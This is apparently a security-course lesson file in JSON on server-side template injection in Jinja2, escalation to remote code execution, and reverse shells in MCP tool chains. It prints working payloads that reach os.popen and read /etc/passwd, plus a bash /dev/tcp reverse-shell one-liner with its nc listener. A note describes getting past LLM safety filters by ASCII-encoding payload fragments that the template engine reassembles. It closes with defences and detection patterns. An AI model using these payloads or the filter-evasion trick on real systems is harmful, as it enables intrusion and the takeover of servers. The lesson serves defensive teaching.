@@ -1,0 +1,59 @@
+{
+  "slug": "09-ssti-rce",
+  "title": "SSTI & Reverse Shells",
+  "type": "content",
+  "readingtime": "9 min read",
+  "difficulty": "Advanced",
+  "sections": [
+    {
+      "type": "content",
+      "body": "# SSTI & Reverse Shells\n\nThis lesson goes deeper into the two techniques that turn an MCP tool bug into full server control: Server-Side Template Injection (SSTI) and reverse shells.\n\n## Quick recap: what is SSTI?\n\nA template is a document with placeholders, similar to a form letter:\n\n> Dear {{ name }}, your order shipped.\n\nA template engine fills in `{{ name }}` automatically. The danger is when the engine also evaluates code placed inside those placeholders, instead of treating it as plain, inert text.\n\nIf user data reaches the engine unfiltered, an attacker can write real code into that placeholder, and the server runs it."
+    },
+    {
+      "type": "diagram",
+      "src": "flowchart LR\n    A[User data] --> B{Template engine}\n    B -->|treats as text| C[Safe output]\n    B -->|evaluates it| D[Code runs on server]\n    style D fill:#ef4444,color:#fff"
+    },
+    {
+      "type": "content",
+      "body": "## Climbing from SSTI to RCE\n\nRCE stands for Remote Code Execution, meaning running your own commands on someone else's server. It's one of the most severe possible outcomes in security.\n\nThe typical path in a Python/Jinja2 environment looks like this:\n\n1. Confirm the engine actually evaluates expressions, by leaking internal objects.\n2. Reach Python's built-in modules through the template's global namespace.\n3. Access the os module specifically.\n4. Use os.popen() or something similar to run real shell commands."
+    },
+    {
+      "type": "code",
+      "language": "python",
+      "body": "# Progressive SSTI -> RCE in Jinja2\n\n# 1. Confirm evaluation (leaks module names)\n{{ lipsum.__globals__.keys() }}\n\n# 2. Reach os and run a command\n{{ lipsum.__globals__['os'].popen('whoami').read() }}\n\n# 3. Read a sensitive file\n{{ lipsum.__globals__['os'].popen('cat /etc/passwd').read() }}"
+    },
+    {
+      "type": "content",
+      "body": "## What is a reverse shell?\n\nRunning one command at a time this way is slow. A reverse shell instead gives an attacker a live, interactive terminal directly on the victim server.\n\n### Why \"reverse\"?\n\nNormally, you connect to a server. A reverse shell flips this around entirely: the victim server connects back to the attacker instead. This is clever because most firewalls block incoming connections but tend to allow outgoing ones freely.\n\n**A simple comparison:** instead of you calling the target's phone, which is often blocked, you trick the target into calling your phone instead. Once that connection is made, you can talk freely."
+    },
+    {
+      "type": "diagram",
+      "src": "sequenceDiagram\n    participant A as Attacker (listener)\n    participant V as Victim server\n    Note over A: nc -lvnp 4444\n    V->>A: Outbound connection to attacker\n    A->>V: Sends commands\n    V-->>A: Command output\n    Note over A,V: Interactive shell established"
+    },
+    {
+      "type": "content",
+      "body": "## How it works in practice\n\n1. The attacker starts a listener on their own machine, waiting patiently on a specific port.\n2. The SSTI payload runs a command on the victim that opens a connection back to that listener.\n3. Once connected, the attacker can type commands and see the output in real time.\n\nThe classic Linux one-liner, shown here conceptually:"
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "body": "# Attacker's machine - start listening\nnc -lvnp 4444\n\n# Command executed on the victim via SSTI\n# (opens a shell back to the attacker at 10.0.0.5:4444)\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
+    },
+    {
+      "type": "note",
+      "body": "**Why LLM safety filters block this directly:** phrases like /dev/tcp and >& are obvious, well-known shell-exploit patterns. Attackers defeat these filters by encoding each character as an ASCII code and assembling the full string only inside the template engine itself, so no single stored fragment ever looks malicious on its own."
+    },
+    {
+      "type": "content",
+      "body": "## The MCP angle\n\nIn an MCP chain, the reverse shell payload gets split across many separately stored items and reassembled only at render time, exactly as covered in the previous lesson. When the report is finally rendered, the engine builds the full command and the victim connects back, giving the attacker root access if the server happens to run as root."
+    },
+    {
+      "type": "content",
+      "body": "## How to defend\n\n**Stop SSTI at the source**\n\n- Never pass user-controlled data into a raw template engine.\n- Use a sandboxed environment, such as Jinja2's SandboxedEnvironment, which blocks access to dangerous attributes like __globals__.\n- Treat all template input as untrusted, escaping and validating it properly.\n\n**Limit the blast radius**\n\n- Run tool servers as a low-privilege user, never as root.\n- Use network egress controls so the server can't make arbitrary outbound connections on its own, which directly blocks reverse shells.\n- Containerize and sandbox tool execution wherever possible.\n\n**Detect**\n\n- Alert on outbound connections heading to unusual hosts or ports.\n- Watch closely for patterns like os, popen, __globals__, and /dev/tcp appearing in stored data."
+    },
+    {
+      "type": "content",
+      "body": "## Comparison\n\n| Vulnerable | Secure |\n|---|---|\n| Raw Jinja2 on user data | Sandboxed template environment |\n| Server runs as root | Low-privilege service account |\n| Unrestricted outbound network | Egress filtering blocks reverse shells |\n\n## Key Takeaways\n\n- SSTI happens when a template engine evaluates user data as if it were code.\n- SSTI can escalate all the way to RCE by reaching the os module.\n- A reverse shell makes the victim connect back to the attacker, effectively bypassing standard firewall rules.\n- MCP chains deliver these payloads through split, encoded fragments to evade detection.\n- Defend with sandboxed engines, least privilege, and strict egress filtering."
+    }
+  ]
+}
